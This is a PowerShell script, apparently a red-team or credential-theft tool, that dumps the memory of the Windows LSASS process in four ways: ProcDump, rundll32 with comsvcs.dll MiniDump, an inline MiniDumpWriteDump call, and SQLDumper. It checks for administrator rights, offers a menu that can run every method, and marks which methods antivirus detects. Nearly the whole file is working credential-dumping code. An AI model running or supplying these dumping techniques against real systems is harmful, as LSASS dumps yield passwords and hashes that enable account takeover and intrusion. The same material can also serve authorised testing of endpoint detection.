#ProcDump -> AV detect
function ProcDump {
    param () # Procdump-path,dmpFile-name
    Start-Process -FilePath ".\pstools\procdump64.exe" -ArgumentList " -accepteula -r -Ma lsass.exe procDump-lsass.dmp" # -r:clone,-Ma:Full
}



#Comsvcs.dll -> AV detect
function comsvcsDll {
    param ($OptionalParameters)
    $dumpFile = "comsvcs-lsass.dmp"
    # $processes = get-process lsass
    $lsassPid = (get-process lsass).Id
    rundll32.exe comsvcs.dll MiniDump $lsassPid $dumpFile full
    
}

#MiniDump
function miniDump {
    param ($OptionalParameters)

    Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	public class GetProcessMiniDump
	{
		[DllImport("Dbghelp.dll")]
		public static extern bool MiniDumpWriteDump(
			IntPtr hProcess,
			uint ProcessId,
			IntPtr hFile,
			int DumpType,
			IntPtr ExceptionParam,
			IntPtr UserStreamParam,
			IntPtr CallbackParam);
	}
"@

    # $DumpFilePath = (Get-Location).Path
    $DumpFilePath = $PWD
    [System.Diagnostics.Process]$Process = Get-Process lsass

    $ProcessId = $Process.Id
    $ProcessName = $Process.Name
    $ProcessHandle = $Process.Handle
    $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"

    $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

    $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)

    $Result = [GetProcessMiniDump]::MiniDumpWriteDump($ProcessHandle,$ProcessId,$FileStream.Handle,0x00061907,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)

    $FileStream.Close()

    if(!($Result)){
        $Exception = New-Object ComponentModel.Win32Exception
        $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

        Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue

        throw $ExceptionMessage
    }
    else{
        Write-Output "Dump"
        Get-ChildItem $ProcessDumpPath
        return $ProcessDumpPath
    }
}

# Sqldumper (https://learn.microsoft.com/ja-jp/troubleshoot/sql/tools/use-sqldumper-generate-dump-file)
function Sqldumper{ #[!] Not Test
    # C:\Program Files\Microsoft SQL Server\[number]\Shared\SQLDumper.exe
    # C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe
    
    $numbers = @(150,140,130,120,110,100,90)
    $allFalse = $true
    foreach($number in $numbers){
        $sqldumperPath = Join-Path -Path $env:ProgramFiles -ChildPath "Microsoft SQL Server\${number}\Shared\SQLDumper"
        # Write-Host $sqldumperPath
        if(Test-Path -LiteralPath $sqldumperPath){
            $allFalse = $false
            break
        }
    }

    # dump
    if($allFalse){
        Write-Warning "SQLDumper not Exist"
    }
    else{
        [System.Diagnostics.Process]$Process = Get-Process lsass
        $ProcessId = $Process.Id
        Start-Process -FilePath $sqldumperPath -ArgumentList " ${ProcessId} 0 0x0110"
    }    
}

#main 
# Check Administrator
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
  Write-Warning "Run the Command as an Administrator" 
  Break 
} 

# DUMP
# $ProcessDumpPath = miniDump
$mode = [int]::Parse((Read-Host "Select a mode by number`n[0]:all`n[1]:ProcDump`n[2]:comsvcsDll`n[3]:miniDump`n[4]:sqldumper`n"));

switch($mode){
  0 {ProcDump;Start-Sleep -Seconds 2;comsvcsDll;Start-Sleep -Seconds 2;miniDump;Start-Sleep -Seconds 2;Sqldumper;}
  1 {ProcDump;}
  2 {comsvcsDll;}
  3 {miniDump;}
  4 {Sqldumper;}
  Default{Write-Error "Selection Error"}
}


